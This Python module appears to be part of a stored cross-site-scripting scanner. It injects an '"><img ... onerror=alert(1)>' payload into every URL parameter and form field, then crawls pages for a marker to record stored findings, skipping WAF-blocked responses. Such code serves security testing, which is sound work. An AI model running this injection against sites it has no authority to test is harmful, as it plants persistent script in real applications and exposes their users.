from __future__ import annotations

from . import detect, params, payloads, waf


def _store_payload(mk):
    return '"><img src=x id=' + mk + ' onerror=alert(1)>'


def inject(client, get_targets, forms):
    sent = []
    for url in get_targets or []:
        for name in params.injectable(url):
            mk = payloads.marker()
            pay = _store_payload(mk)
            try:
                client.get(params.set_param(url, name, pay))
            except Exception:
                continue
            sent.append({"marker": mk, "payload": pay, "source_url": url,
                         "param": name, "source_method": "GET"})
    for form in forms or []:
        action = form["action"]
        fields = form["fields"]
        for name in fields:
            mk = payloads.marker()
            pay = _store_payload(mk)
            body = {f: (pay if f == name else "1") for f in fields}
            try:
                client.post(action, body)
            except Exception:
                continue
            sent.append({"marker": mk, "payload": pay, "source_url": action,
                         "param": name, "source_method": "POST"})
    return sent


def harvest(client, pages, sent, max_pages=200):
    findings = []
    index = {s["marker"]: s for s in sent}
    seen = set()
    for page in list(pages)[:max_pages]:
        try:
            resp = client.get(page)
        except Exception:
            continue
        if waf.blocked(resp):
            continue
        try:
            body = resp.text
        except Exception:
            continue
        for mk, s in index.items():
            if mk not in body:
                continue
            if not detect.payload_lands(body, s["payload"]):
                continue
            key = (s["source_url"], s["param"], page)
            if key in seen:
                continue
            seen.add(key)
            findings.append({
                "url": page,
                "param": s["param"],
                "method": "STORED",
                "context": "html",
                "contexts": ["html"],
                "char_map": "",
                "status": getattr(resp, "status_code", 0),
                "payload": s["payload"],
                "working_payloads": [s["payload"]],
                "evidence": detect.evidence(body, mk),
                "severity": "high",
                "how": "stored",
                "source_url": s["source_url"],
                "source_method": s["source_method"],
                "verified": False,
            })
    return findings


def run(client, get_targets, forms, pages, max_pages=200):
    sent = inject(client, get_targets, forms)
    return harvest(client, pages, sent, max_pages=max_pages), sent
